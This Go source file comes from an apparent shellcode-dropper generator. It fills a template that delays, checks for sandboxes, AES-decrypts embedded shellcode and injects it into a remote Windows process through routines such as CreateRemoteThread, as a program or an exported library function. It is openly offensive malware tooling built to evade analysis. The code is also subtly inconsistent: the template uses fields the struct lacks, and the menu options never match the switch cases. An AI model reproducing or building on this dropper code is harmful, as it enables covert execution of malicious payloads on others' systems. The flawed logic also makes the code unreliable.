package remote

import (
	"io"
	"log"
	"text/template"

	"github.com/Epictetus24/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}

type RemoteDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	RemoteProc string //Program Proc to Execute in
	Delay      int
	Dlls       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
}

var FuncName = "checkData"
var Export = "export"

const RemoteMain = `package main

import (
	{{.Import}}
	{{.C}}
	{{.BoxChkImp}}

)
var hope = "{{.Domain}}"

{{.BoxChkFunc}}

func init() {
	{{.ChkBox}}	
}
func main() {

	{{.FuncName}}()

}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	program := "{{.RemoteProc}}"
	args := "{{.Args}}"

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"

	pid, err := strconv.Atoi("{{.Pid}}")
	if err != nil {
		pid = 0
	}
	time.Sleep({{.Delay}}* time.Second)



	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

// Writes a remote template, which usually includes a new process with arguments.
func (cd *RemoteDropper) WriteSrc(writer io.Writer) error {
	tmpl, err := template.New("remote").Parse(RemoteMain)
	if err != nil {
		log.Fatalf("[remote] Error writing template: %v\n", err)
		return err
	}
	cd.FuncName = FuncName
	cd.Export = ""
	cd.C = ""

	err = tmpl.Execute(writer, cd)
	return nil

}

func (cd *RemoteDropper) WriteSharedSrc(writer io.Writer) error {
	tmpl, err := template.New("remote").Parse(RemoteMain)
	if err != nil {
		return err
	}
	cd.C = `"C"`
	cd.FuncName = FuncName
	cd.Export = Export
	err = tmpl.Execute(writer, cd)
	return nil

}

func NewRemote(proc, domain string, delay int) RemoteDropper {
	var cD RemoteDropper
	cD.RemoteProc = proc
	cD.Delay = delay

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the remote dropper you would like to use:")

	switch selected {
	case "CreateRemoteThread":
		cD.Dlls = CreateRemoteThreadDlls
		cD.Inject = CreateRemoteThread
		cD.Import = CreateRemoteThreadImports
	case "CreateRemoteThreadNative":
		cD.Dlls = CreateRemoteThreadNativeDlls
		cD.Inject = CreateRemoteThreadNative
		cD.Import = CreateRemoteThreadNativeImports
	case "RtlCreateUserThread":
		cD.Dlls = RtlCreateUserThreadDlls
		cD.Inject = RtlCreateUserThread
		cD.Import = RtlCreateUserThreadImports
	}

	return cD
}
